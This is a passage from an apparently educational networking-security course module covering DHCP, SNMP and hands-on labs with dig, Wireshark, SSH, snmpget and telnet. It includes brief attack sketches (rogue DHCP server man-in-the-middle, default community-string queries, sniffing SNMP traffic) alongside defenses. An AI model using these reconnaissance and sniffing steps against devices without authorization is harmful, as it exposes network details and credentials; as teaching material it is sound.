2. Client broadcasts DISCOVER
3. Attacker responds with OFFER (faster than legitimate server)
4. Client accepts attacker's DHCP offer
5. Attacker tells client: "Your gateway is 192.168.1.100"
6. Attacker becomes man-in-the-middle
```

**Defense**: DHCP snooping (only trust DHCP server on specific port), network segmentation

#### DHCP Information Leakage

**Attack**: Attacker captures DHCP traffic and learns:
- Network structure (subnet masks, gateways)
- DNS servers
- NTP servers
- Other configuration details

**Defense**: DHCP is broadcast; encryption not feasible. Trust physical network.

---

## SNMP — Simple Network Management Protocol

SNMP allows network administrators to monitor and configure devices remotely (routers, switches, printers, servers).

**Port**: 161 (agent), 162 (trap/alert)
**Protocol**: UDP
**Purpose**: Network monitoring and device management

### SNMP Versions

#### SNMPv1 (1988 — Original)

**Security**: Plain text community strings (essentially passwords)

```
GET request to 192.168.1.1:161
Community String: public
OID: 1.3.6.1.2.1.1.1.0 (sysDescr — system description)

Response: "Cisco IOS Software, C2900 Software..."
```

**Vulnerabilities**:
- Community string "public" is default and widely known
- No encryption; community string visible in plaintext
- No authentication; anyone can query

**Security risk**: Very high. Still used in legacy systems but should be disabled.

#### SNMPv2c (1993 — Improved for SNMP v2)

**Improvements**: Bulk data retrieval, more error codes

**Security**: Still uses community strings (same vulnerability as v1)

**Usage**: Slightly more modern than v1, but still insecure

#### SNMPv3 (2002 — Modern with Security)

**Improvements**:
- **User-based authentication**: Named users with passwords
- **Encryption**: All traffic encrypted (optional but recommended)
- **Access control**: Fine-grained permissions per user

```
SNMPv3 GET request to 192.168.1.1:161
User: admin
Authentication: HMAC-SHA (password-based)
Encryption: AES (traffic encrypted)
OID: 1.3.6.1.2.1.1.1.0

Response: [encrypted] "Cisco IOS Software..."
```

**Modern standard**: Use SNMPv3 for all new deployments.

### SNMP Operations

#### GET

Retrieve a single object (OID value).

```
snmpget -v3 -u admin -A password 192.168.1.1 1.3.6.1.2.1.1.1.0
```

#### GETNEXT

Retrieve the next object in the tree (used for iteration).

#### GETBULK

Retrieve multiple objects efficiently (bulk operation).

#### SET

Modify a value (requires write access).

```
snmpset -v3 -u admin -A password 192.168.1.1 1.3.6.1.2.1.1.4.0 s "New System Name"
```

#### TRAP

Agent sends unsolicited notification (alert).

```
Example: Router detects link down on port GigabitEthernet0/1
Router sends TRAP to manager:
  alertType: linkDown
  interface: GigabitEthernet0/1
  timestamp: 2026-06-11 14:23:45
```

### SNMP Object Identifiers (OIDs)

OIDs are hierarchical addresses for objects in SNMP.

**Format**: Dot notation, e.g., `1.3.6.1.2.1.1.1.0`

**Common OIDs**:

| OID | Object | Value |
|-----|--------|-------|
| 1.3.6.1.2.1.1.1.0 | sysDescr | System description (OS, hardware) |
| 1.3.6.1.2.1.1.3.0 | sysUpTime | How long system has been running |
| 1.3.6.1.2.1.1.5.0 | sysName | Host name |
| 1.3.6.1.2.1.2.2.1.8.1 | ifOperStatus | Interface status (up/down) |
| 1.3.6.1.2.1.25.3.2.1.5.1 | hrDeviceDescr | Device description |

**Query example**:
```bash
snmpwalk -v3 -u admin -A password 192.168.1.1 1.3.6.1.2.1.1
# Returns all objects under 1.3.6.1.2.1.1 subtree
```

### SNMP Security Issues

#### Default Community Strings

**Attack**:
```
Attacker: snmpget -v1 -c public 192.168.1.1 1.3.6.1.2.1.1.1.0
Response: System description (gives attacker information about device)
```

**Defense**: Change default "public" and "private" community strings, use SNMPv3

#### Plaintext Community Strings (SNMPv1/v2c)

**Attack**:
```
Attacker captures SNMP traffic: tcpdump port 161
Attacker sees community string in plaintext
Attacker now has full SNMP access
```

**Defense**: Use SNMPv3 with encryption, restrict SNMP to trusted management network

#### Information Disclosure

**Attack**: Attacker learns network topology, device inventory, software versions

```
snmpwalk 192.168.1.1 1.3.6.1.2.1.1
# Returns:
# - System description (OS, version)
# - System uptime
# - System name
# - All interfaces and their status
```

**Defense**: Restrict SNMP to authenticated users only, don't expose SNMP to internet

---

## Hands-on: Protocol Configuration and Capture

This lab teaches you to configure, test, and capture application-layer protocols.

### Lab 1: DNS Resolution and Query

**Objective**: Understand DNS hierarchy and cache behavior

**Tools needed**: dig, nslookup, or online DNS query tool

#### Part A: DNS Query Steps

```bash
# 1. Query root nameserver
dig +trace google.com
# Output shows:
# - Query to root nameserver
# - Response: "Ask TLD server"
# - Query to TLD nameserver
# - Response: "Ask authoritative nameserver"
# - Query to authoritative nameserver
# - Final answer: IP address

# 2. Query specific nameserver
dig @8.8.8.8 google.com
# Query Google's public DNS for google.com

# 3. Query specific record type
dig google.com MX
# Get mail servers for google.com

dig google.com TXT
# Get TXT records (SPF, DKIM, etc.)
```

#### Part B: DNS Cache Behavior

```bash
# 1. First query (no cache)
time dig google.com

# 2. Second query (cached)
time dig google.com
# Notice second is much faster (local resolver cached)

# 3. Flush DNS cache (OS-specific)
# Windows: ipconfig /flushdns
# Linux: sudo systemctl restart systemd-resolved
# Mac: sudo dscacheutil -flushcache

# 4. Query cached TTL
dig google.com +noall +answer
# Output shows TTL (time remaining)
```

### Lab 2: HTTP/HTTPS Capture with Wireshark

**Objective**: Observe HTTP and HTTPS traffic differences

#### Part A: HTTP Traffic (plain text)

```
1. Open Wireshark
2. Start capture on your network interface
3. Open browser, visit http://example.com (if allowed)
4. Stop capture
5. Filter: http
6. Inspect packets:
   - View GET request (plaintext, visible in Wireshark)
   - View response (200 OK, plaintext HTML visible)
   - See Set-Cookie headers (if any)
```

#### Part B: HTTPS Traffic (encrypted)

```
1. Start fresh Wireshark capture
2. Visit https://example.com
3. Stop capture
4. Filter: tls
5. Inspect packets:
   - TLS handshake (ClientHello, ServerHello, Certificate, etc.)
   - Encrypted data (FIN packets, indecipherable)
   - Notice: No HTTP data visible (encrypted)
```

**Observation**: 
- HTTP: Everything visible
- HTTPS: Only handshake and packet sizes visible; data encrypted

### Lab 3: SSH Key Generation and Connection

**Objective**: Understand SSH authentication methods

#### Part A: Generate SSH Key Pair

```bash
# Generate 4096-bit RSA key
ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "passphrase123"
# -f: file location
# -N: passphrase (empty for no passphrase, not recommended)

# View public key
cat ~/.ssh/id_rsa.pub
# Output: ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDx... user@computer

# View private key (keep secret!)
ls -la ~/.ssh/
# Private key should be readable only by you (chmod 600)
```

#### Part B: SSH Connection with Key

```bash
# Connect using key
ssh -i ~/.ssh/id_rsa alice@server.com
# (no password prompt if key is accepted)

# Test key fingerprint (verify on first connection)
ssh-keygen -l -f ~/.ssh/id_rsa.pub
# Output: 256 abcd1234abcd1234... user@computer
```

#### Part C: SSH Tunneling Demo

```bash
# Local port forwarding (access internal database through jump server)
ssh -L 3306:internal-db.company.com:3306 alice@jump-server.com

# Now you can connect to localhost:3306 as if it were the internal database
mysql -u root -p -h 127.0.0.1 -P 3306
```

### Lab 4: DHCP Capture

**Objective**: Observe DHCP DORA process

#### Part A: Capture DHCP Traffic

```
1. Open Wireshark
2. Filter: dhcp
3. On your machine, renew DHCP lease:
   - Windows: ipconfig /release && ipconfig /renew
   - Linux: sudo dhclient -r eth0 && sudo dhclient eth0
   - Mac: System Preferences > Network > Wi-Fi > Advanced > Renew DHCP Lease

4. Observe DHCP packets in Wireshark:
   - DHCPDISCOVER (broadcast from 0.0.0.0:68)
   - DHCPOFFER (from server, offers 192.168.1.X)
   - DHCPREQUEST (broadcast, client requests IP)
   - DHCPACK (server confirms, assigns IP + lease time)
```

#### Part B: Inspect Lease Details

```
Expand DHCPACK packet:
- Your IP Address: 192.168.1.100
- Subnet Mask: 255.255.255.0
- Router: 192.168.1.1
- Domain Name Server: 8.8.8.8, 1.1.1.1
- Lease Time: 7200 seconds (2 hours)
```

### Lab 5: SNMP Query

**Objective**: Query network device with SNMP

#### Part A: SNMPv1 Query (if available for testing)

```bash
# Query a router or managed switch (requires network device)
snmpget -v1 -c public 192.168.1.1 1.3.6.1.2.1.1.1.0

# Output might be:
# SNMPv2-MIB::sysDescr.0 = STRING: "Cisco IOS Software Version 15.0"
```

#### Part B: SNMPv3 Query (Secure)

```bash
# Query with SNMPv3 authentication
snmpget -v3 -u admin -A password123 -x -X privpassword 192.168.1.1 1.3.6.1.2.1.1.1.0

# Query multiple objects (walk)
snmpwalk -v3 -u admin -A password123 192.168.1.1 1.3.6.1.2.1.1
```

### Lab 6: Email Protocol Testing

**Objective**: Understand SMTP/POP3/IMAP flow

#### Part A: Test SMTP (Sending) with Telnet

```bash
# Connect to SMTP server
telnet smtp.gmail.com 587

# Type commands:
EHLO mycomputer
STARTTLS
(connection upgrades to TLS)
AUTH LOGIN
(enter base64-encoded credentials)
MAIL FROM:<sender@example.com>
RCPT TO:<recipient@example.com>
DATA
Subject: Test email
This is a test.
.
QUIT
```

#### Part B: Test IMAP (Receiving) with Telnet

```bash
# Connect to IMAP server
telnet imap.gmail.com 993
(connection uses TLS from start)

# Type commands:
LOGIN alice@gmail.com password
SELECT INBOX
SEARCH UNSEEN
FETCH 1 BODY[HEADER]
LOGOUT
```

---

## Summary

### Key Concepts

**Application Layer Protocols**:
- **DNS**: Translates domain names to IPs; hierarchical system with root, TLD, authoritative nameservers
- **HTTP/HTTPS**: Web protocol; HTTP unencrypted, HTTPS encrypted with TLS
- **FTP/SFTP/FTPS**: File transfer; SFTP recommended for security
- **SSH**: Remote command execution and tunneling; use keys not passwords
- **Email**: SMTP for sending, POP3/IMAP for receiving; IMAP for multi-device sync
- **DHCP**: Automatic IP assignment via DORA process
- **SNMP**: Network device monitoring; SNMPv3 for security

**Security Implications**:
- Each protocol has attack vectors and defenses
- Encryption (TLS, SSH) protects data in transit
- Authentication (SSH keys, SNMP users) protects access
- Monitoring (Wireshark, SNMP queries) enables detection

### Practical Skills

- Capture and analyze protocols with Wireshark
- Use DNS tools (dig, nslookup) to understand resolution
- Generate and use SSH keys
- Observe DHCP lease assignment
- Query devices with SNMP
- Understand email protocol flow

---

## Next Steps

- Capture and analyze a full HTTP transaction in Wireshark
- Set up SSH key-based authentication for your own servers
- Use SSH tunneling to securely access internal services
- Monitor network devices with SNMP
- Analyze DNS queries and understand caching behavior
- Implement email authentication (SPF, DKIM, DMARC) for your domain

---

**Previous Module:** [← Module 3 — Networking Deep Dive Part 1](Module_3_Networking_Deep_Dive_Part_1.md)

**Next Module:** [Module 5 — Cryptography Fundamentals →](Module_5_Cryptography_Fundamentals.md)

---

*Module 4 | Phase 1: Absolute Foundations | cybersecurity_beginner_to_advance*
